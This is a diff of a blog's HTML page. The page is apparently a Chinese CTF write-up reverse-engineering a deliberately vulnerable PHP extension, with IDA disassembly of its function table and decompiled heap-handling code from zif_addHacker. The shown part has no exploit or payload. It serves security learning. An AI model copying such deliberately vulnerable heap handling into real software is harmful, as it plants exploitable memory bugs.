+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> zts<span class="token punctuation">;</span>
+	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_zend_ini_entry</span> <span class="token operator">*</span>ini_entry<span class="token punctuation">;</span>
+	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_zend_module_dep</span> <span class="token operator">*</span>deps<span class="token punctuation">;</span>
+	<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>
+	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_zend_function_entry</span> <span class="token operator">*</span>functions<span class="token punctuation">;</span>
+	<span class="token function">zend_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>module_startup_func<span class="token punctuation">)</span><span class="token punctuation">(</span>INIT_FUNC_ARGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">zend_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>module_shutdown_func<span class="token punctuation">)</span><span class="token punctuation">(</span>SHUTDOWN_FUNC_ARGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">zend_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>request_startup_func<span class="token punctuation">)</span><span class="token punctuation">(</span>INIT_FUNC_ARGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">zend_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>request_shutdown_func<span class="token punctuation">)</span><span class="token punctuation">(</span>SHUTDOWN_FUNC_ARGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>info_func<span class="token punctuation">)</span><span class="token punctuation">(</span>ZEND_MODULE_INFO_FUNC_ARGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>version<span class="token punctuation">;</span>
+	<span class="token class-name">size_t</span> globals_size<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">ZTS</span></span>
+	ts_rsrc_id<span class="token operator">*</span> globals_id_ptr<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>
+	<span class="token keyword">void</span><span class="token operator">*</span> globals_ptr<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+	<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>globals_ctor<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>global<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>globals_dtor<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>global<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">zend_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>post_deactivate_func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">int</span> module_started<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> type<span class="token punctuation">;</span>
+	<span class="token keyword">void</span> <span class="token operator">*</span>handle<span class="token punctuation">;</span>
+	<span class="token keyword">int</span> module_number<span class="token punctuation">;</span>
+	<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>build_id<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>所以 从functions指针跟过去后可以发现出题人自定义的函数有四个，分别是addHacker removeHacker displayHacker editHacker</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.data:000000000000409F 00                            db    0</span><br><span class="line">.data:00000000000040A0 03 20 00 00 00 00 00 00       dq offset aVuln                         ; &quot;vuln&quot;</span><br><span class="line">.data:00000000000040A8 60 3D 00 00 00 00 00 00       dq offset off_3D60                      ; &quot;addHacker&quot;</span><br><span class="line">.data:00000000000040B0 C0 11 00 00 00 00 00 00       dq offset zm_startup_vuln</span><br><span class="line">.data:00000000000040B8 00 12 00 00 00 00 00 00       dq offset zm_shutdown_vuln</span><br><span class="line">.data:00000000000040C0 00                            db    0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data.rel.ro:0000000000003D60 1E 20 00 00 00 00 00 00       off_3D60 dq offset aAddhacker           ; DATA XREF: .data:00000000000040A8↓o</span><br><span class="line">.data.rel.ro:0000000000003D60                                                                       ; &quot;addHacker&quot;</span><br><span class="line">.data.rel.ro:0000000000003D68 10 12 00 00 00 00 00 00       dq offset zif_addHacker</span><br><span class="line">.data.rel.ro:0000000000003D70 00 3D 00 00 00 00 00 00       dq offset unk_3D00</span><br><span class="line">.data.rel.ro:0000000000003D78 02                            db    2</span><br><span class="line">.data.rel.ro:0000000000003D79 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D7A 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D7B 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D7C 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D7D 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D7E 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D7F 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D80 28 20 00 00 00 00 00 00       dq offset aRemovehacker                 ; &quot;removeHacker&quot;</span><br><span class="line">.data.rel.ro:0000000000003D88 50 13 00 00 00 00 00 00       dq offset zif_removeHacker</span><br><span class="line">.data.rel.ro:0000000000003D90 C0 3C 00 00 00 00 00 00       dq offset unk_3CC0</span><br><span class="line">.data.rel.ro:0000000000003D98 01                            db    1</span><br><span class="line">.data.rel.ro:0000000000003D99 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D9A 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D9B 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D9C 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D9D 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D9E 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003D9F 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003DA0 35 20 00 00 00 00 00 00       dq offset aDisplayhacker                ; &quot;displayHacker&quot;</span><br><span class="line">.data.rel.ro:0000000000003DA8 20 15 00 00 00 00 00 00       dq offset zif_displayHacker</span><br><span class="line">.data.rel.ro:0000000000003DB0 80 3C 00 00 00 00 00 00       dq offset unk_3C80</span><br><span class="line">.data.rel.ro:0000000000003DB8 01                            db    1</span><br><span class="line">.data.rel.ro:0000000000003DB9 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003DBA 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003DBB 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003DBC 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003DBD 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003DBE 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003DBF 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000003DC0 43 20 00 00 00 00 00 00       dq offset aEdithacker                   ; &quot;editHacker&quot;</span><br><span class="line">.data.rel.ro:0000000000003DC8 10 14 00 00 00 00 00 00       dq offset zif_editHacker</span><br><span class="line">.data.rel.ro:0000000000003DD0 20 3C 00 00 00 00 00 00       dq offset unk_3C20</span><br><span class="line">.data.rel.ro:0000000000003DD8 02                            db    2</span><br><span class="line">.data.rel.ro:0000000000003DD9 00                            db    0</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">.data:000000000000409F 00                            db    0
+.data:00000000000040A0 03 20 00 00 00 00 00 00       dq offset aVuln                         ; &quot;vuln&quot;
+.data:00000000000040A8 60 3D 00 00 00 00 00 00       dq offset off_3D60                      ; &quot;addHacker&quot;
+.data:00000000000040B0 C0 11 00 00 00 00 00 00       dq offset zm_startup_vuln
+.data:00000000000040B8 00 12 00 00 00 00 00 00       dq offset zm_shutdown_vuln
+.data:00000000000040C0 00                            db    0
 
-<h4 id="zif-addHacker"><a href="#zif-addHacker" class="headerlink" title="zif_addHacker"></a>zif_addHacker</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">zif_addHacker</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v11; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// r13</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *arg2; <span class="comment">// [rsp+8h] [rbp-40h] BYREF</span></span><br><span class="line">  _BYTE *arg1; <span class="comment">// [rsp+10h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v3, &amp;unk_2000, &amp;arg1, &amp;arg2) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg1[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; arg2[<span class="number">8</span>] == <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">      v6 = (<span class="type">char</span> *)&amp;chunkList + <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">while</span> ( *v6 != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        v6 += <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">16</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v5;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v7 = (<span class="type">char</span> *)&amp;chunkList + <span class="number">16</span> * v2;</span><br><span class="line">      v8 = (_QWORD *)_emalloc(*(_QWORD *)(*(_QWORD *)arg2 + <span class="number">16LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">      v9 = (<span class="type">void</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)arg1 + <span class="number">16LL</span>));</span><br><span class="line">      *v8 = v9;</span><br><span class="line">      v10 = *(_QWORD *)(*(_QWORD *)arg1 + <span class="number">16LL</span>);</span><br><span class="line">      v11 = (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)arg1 + <span class="number">24LL</span>);</span><br><span class="line">      v8[<span class="number">1</span>] = v10;</span><br><span class="line">      <span class="built_in">memcpy</span>(v9, v11, v10);</span><br><span class="line">      v12 = arg2;</span><br><span class="line">      <span class="built_in">memcpy</span>(v8 + <span class="number">2</span>, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)arg2 + <span class="number">24LL</span>), *(_QWORD *)(*(_QWORD *)arg2 + <span class="number">16LL</span>));</span><br><span class="line">      v13 = *(_QWORD *)(*(_QWORD *)v12 + <span class="number">16LL</span>);</span><br><span class="line">      *(_QWORD *)v7 = v8;</span><br><span class="line">      *((_DWORD *)v7 + <span class="number">2</span>) = <span class="number">13</span>;</span><br><span class="line">      *((_BYTE *)v8 + v13 + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v16 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+.data.rel.ro:0000000000003D60 1E 20 00 00 00 00 00 00       off_3D60 dq offset aAddhacker           ; DATA XREF: .data:00000000000040A8↓o
+.data.rel.ro:0000000000003D60                                                                       ; &quot;addHacker&quot;
+.data.rel.ro:0000000000003D68 10 12 00 00 00 00 00 00       dq offset zif_addHacker
+.data.rel.ro:0000000000003D70 00 3D 00 00 00 00 00 00       dq offset unk_3D00
+.data.rel.ro:0000000000003D78 02                            db    2
+.data.rel.ro:0000000000003D79 00                            db    0
+.data.rel.ro:0000000000003D7A 00                            db    0
+.data.rel.ro:0000000000003D7B 00                            db    0
+.data.rel.ro:0000000000003D7C 00                            db    0
+.data.rel.ro:0000000000003D7D 00                            db    0
+.data.rel.ro:0000000000003D7E 00                            db    0
+.data.rel.ro:0000000000003D7F 00                            db    0
+.data.rel.ro:0000000000003D80 28 20 00 00 00 00 00 00       dq offset aRemovehacker                 ; &quot;removeHacker&quot;
+.data.rel.ro:0000000000003D88 50 13 00 00 00 00 00 00       dq offset zif_removeHacker
+.data.rel.ro:0000000000003D90 C0 3C 00 00 00 00 00 00       dq offset unk_3CC0
+.data.rel.ro:0000000000003D98 01                            db    1
+.data.rel.ro:0000000000003D99 00                            db    0
+.data.rel.ro:0000000000003D9A 00                            db    0
+.data.rel.ro:0000000000003D9B 00                            db    0
+.data.rel.ro:0000000000003D9C 00                            db    0
+.data.rel.ro:0000000000003D9D 00                            db    0
+.data.rel.ro:0000000000003D9E 00                            db    0
+.data.rel.ro:0000000000003D9F 00                            db    0
+.data.rel.ro:0000000000003DA0 35 20 00 00 00 00 00 00       dq offset aDisplayhacker                ; &quot;displayHacker&quot;
+.data.rel.ro:0000000000003DA8 20 15 00 00 00 00 00 00       dq offset zif_displayHacker
+.data.rel.ro:0000000000003DB0 80 3C 00 00 00 00 00 00       dq offset unk_3C80
+.data.rel.ro:0000000000003DB8 01                            db    1
+.data.rel.ro:0000000000003DB9 00                            db    0
+.data.rel.ro:0000000000003DBA 00                            db    0
+.data.rel.ro:0000000000003DBB 00                            db    0
+.data.rel.ro:0000000000003DBC 00                            db    0
+.data.rel.ro:0000000000003DBD 00                            db    0
+.data.rel.ro:0000000000003DBE 00                            db    0
+.data.rel.ro:0000000000003DBF 00                            db    0
+.data.rel.ro:0000000000003DC0 43 20 00 00 00 00 00 00       dq offset aEdithacker                   ; &quot;editHacker&quot;
+.data.rel.ro:0000000000003DC8 10 14 00 00 00 00 00 00       dq offset zif_editHacker
+.data.rel.ro:0000000000003DD0 20 3C 00 00 00 00 00 00       dq offset unk_3C20
+.data.rel.ro:0000000000003DD8 02                            db    2
+.data.rel.ro:0000000000003DD9 00                            db    0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="zif-addHacker"><a href="#zif-addHacker" class="headerlink" title="zif_addHacker"></a>zif_addHacker</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">zif_addHacker</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// rbp</span>
+  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
+  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
+  _BYTE <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment">// r12</span>
+  _QWORD <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token class-name">size_t</span> v10<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
+  <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token comment">// rsi</span>
+  _BYTE <span class="token operator">*</span>v12<span class="token punctuation">;</span> <span class="token comment">// r13</span>
+  __int64 v13<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  _BYTE <span class="token operator">*</span>arg2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-40h] BYREF</span>
+  _BYTE <span class="token operator">*</span>arg1<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-38h] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-30h]</span>
+
+  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v16 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">zend_parse_parameters</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_2000<span class="token punctuation">,</span> <span class="token operator">&amp;</span>arg1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>arg2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> arg1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6</span> <span class="token operator">&amp;&amp;</span> arg2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      v5 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+      v6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>chunkList <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span>
+      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v6 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+      <span class="token punctuation">&#123;</span>
+        <span class="token operator">++</span>v5<span class="token punctuation">;</span>
+        v6 <span class="token operator">+=</span> <span class="token number">16</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">16</span> <span class="token punctuation">)</span>
+          <span class="token keyword">goto</span> LABEL_9<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      v2 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
+LABEL_9<span class="token operator">:</span>
+      v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>chunkList <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> v2<span class="token punctuation">;</span>
+      v8 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_emalloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg2 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      v9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_emalloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg1 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token operator">*</span>v8 <span class="token operator">=</span> v9<span class="token punctuation">;</span>
+      v10 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg1 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      v11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg1 <span class="token operator">+</span> <span class="token number">24LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span>
+      <span class="token function">memcpy</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v11<span class="token punctuation">,</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      v12 <span class="token operator">=</span> arg2<span class="token punctuation">;</span>
+      <span class="token function">memcpy</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg2 <span class="token operator">+</span> <span class="token number">24LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg2 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      v13 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v7 <span class="token operator">=</span> v8<span class="token punctuation">;</span>
+      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v7 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>
+      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v8 <span class="token operator">+</span> v13 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> v16 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/212b2834e9fbcb9a48b9cb709713b6cb197607cc/docs/source/core/data-structures/zval.rst#L23">https://github.com/php/php-src/blob/212b2834e9fbcb9a48b9cb709713b6cb197607cc/docs/source/core/data-structures/zval.rst#L23</a></p>
 <p>zend_parse_parameters是一个可变参数函数，用途是根据指定的格式字符串解析和验证传入的参数，并将解析后的值存储在相应的变量中。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZEND_API zend_result zend_parse_parameters(uint32_t num_args, const char *type_spec, ...);</span><br></pre></td></tr></table></figure>
